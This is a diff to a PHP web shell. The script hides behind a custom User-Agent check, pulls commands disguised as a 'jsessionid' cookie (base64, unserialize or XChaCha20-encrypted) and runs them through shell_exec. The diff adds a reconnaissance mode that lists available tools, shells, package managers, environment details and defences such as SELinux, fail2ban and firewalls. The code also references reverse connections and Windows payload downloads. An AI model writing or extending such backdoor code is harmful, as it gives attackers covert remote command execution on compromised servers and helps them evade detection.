@@ -154,7 +154,6 @@ function b64($data, $switch)
 
 function checkComs()
 {
-    echo "[ !! ]Avail Commands: [ !! ]\n";
     $lincommands = array(
         "perl", 'python', 'php', 'mysql', 'pg_ctl', 'wget', 'curl', 'lynx', 'w3m', 'gcc', 'g++',
         'cobc', 'javac', 'maven', 'java', 'awk', 'sed', 'ftp', 'ssh', 'vmware', 'virtualbox',
@@ -169,7 +168,6 @@ function checkComs()
 
 function parseProtections()
 {
-    echo "Protections: \n";
     $protections = array(
         "selinux", "iptables", "pfctl", "firewalld", "yast", "yast2", "fail2ban", "denyhost", "nftables", "firewall-cmd"
     );
@@ -181,7 +179,6 @@ function parseProtections()
 function checkShells()
 {
     $shells = array("ksh", "csh", "zsh", "bash", "sh", "tcsh");
-    echo("Shells:\n");
     foreach ($shells as $shell) {
         echo(shell_exec("which " . $shell));
     }
@@ -232,8 +229,8 @@ function checkSystem()
         windows("azh", "dl");
         windows("bhe", "dl");
         windows("ncW", "dl");
-		windows("wpwn", "dl");
-		windows("wpwns", "dl");
+	windows("wpwn", "dl");
+	windows("wpwns", "dl");
         return $os;
     } else {
         array_push($os, "Linux");
@@ -308,8 +305,22 @@ function reverseConnections($methods, $host, $port, $shell)
 
 function executeCommands($com, int $run)
 {
-    if (!empty($com) && $run == "1") {
-        echo("~ Info To Remember ~ \n" . shell_exec($com));
+    if ($com === 'base' && $run == "1") {
+	$s = checkSystem();
+        echo str_repeat("-", 40).PHP_EOL."Commands: ".PHP_EOL;
+        checkComs();
+        echo str_repeat("-", 40).PHP_EOL."Package Managers: ".PHP_EOL;
+        checkPack();
+        echo str_repeat("-", 40).PHP_EOL."Shells on system: ".PHP_EOL;
+        checkShells();
+        echo str_repeat("-", 40).PHP_EOL."System info: ".PHP_EOL;
+        echo "{$s[0]}".PHP_EOL;
+        echo str_repeat("-", 40).PHP_EOL."System Self Protection: ".PHP_EOL;
+        parseProtections();
+        echo str_repeat("-", 40).PHP_EOL."ENV Information: ".PHP_EOL;
+        showEnv($s[0]);
+        echo str_repeat("-", 40).PHP_EOL."Interesting information to remember: ".PHP_EOL;
+        echo(shell_exec(base));
     } else {
         echo("\nExecuting: " . $com . "\n" . shell_exec($com));
     }
@@ -394,13 +405,17 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
         $split = null;
         if ($_POST['cr'] === "1") {
             $split = base64_decode(unserialize(base64_decode($_COOKIE['jsessionid']), ["allowed_classes" => false]));
+	    executeCommands($split, "0");
+        } elseif ($_POST['cr'] === '1b'){
+            $split = base64_decode($_COOKIE['jsessionid']);
+            executeCommands($split, '1');
         } else {
             $s = $_COOKIE['jsessionid'];
             $v = explode(".", base64_decode($s));
             $split = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(base64_decode($v[3]), hex2bin($v[2]), hex2bin($v[0]), hex2bin($v[1]));
-            echo print_r($split);
-        }
-        executeCommands($split, "0");
+            $split = base64_decode($split);
+	    executeCommands($split, "0");
+	}
     } elseif (isset($_POST["clone"])) {
         if (!empty($_POST["ROS"])) {
             $ROS = htmlentities($_POST["ROS"]);
